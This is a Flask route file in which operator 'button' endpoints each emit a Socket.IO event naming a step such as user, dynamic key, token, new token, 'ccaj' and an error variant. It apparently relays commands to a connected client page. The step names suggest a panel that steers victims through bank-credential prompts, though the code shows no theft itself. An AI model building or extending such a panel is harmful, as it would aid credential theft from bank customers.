from flask import request, blueprints, redirect, session, render_template, jsonify
from config.bd import socketio
from flask_socketio import emit

buttons_routes = blueprints.Blueprint("buttons", __name__)

@buttons_routes.route('/din', methods=['POST'])
def din():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'din', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/newdin', methods=['POST'])
def newdin():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'newdin', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/user', methods=['POST'])
def user():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'user', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/newUser', methods=['POST'])
def newUser():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'newUser', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/finish', methods=['POST'])
def finish():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'finish', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/token', methods=['POST'])
def token():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'token', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/newToken', methods=['POST'])
def newToken():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'newToken', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/ccaj', methods=['POST'])
def ccaj():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'ccaj', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/ccajerror', methods=['POST'])
def ccajeror():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'ccajerror', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/error', methods=['POST'])
def error():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'error', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200 


@buttons_routes.route('/logsUs', methods=['POST'])
def logsUser():
    
    data = request.get_json()
    
    socketio.emit('logs', {'valor': 'us', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/logdin', methods=['POST'])
def logsdin():
    
    data = request.get_json()
    
    socketio.emit('logs', {'valor': 'din', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/lognewdin', methods=['POST'])
def logsnewdin():
    
    data = request.get_json()
    
    socketio.emit('logs', {'valor': 'newdin', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@buttons_routes.route('/logsfinish', methods=['POST'])
def logsFinish():
    
    data = request.get_json()
    
    socketio.emit('logs', {'valor': 'finish', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200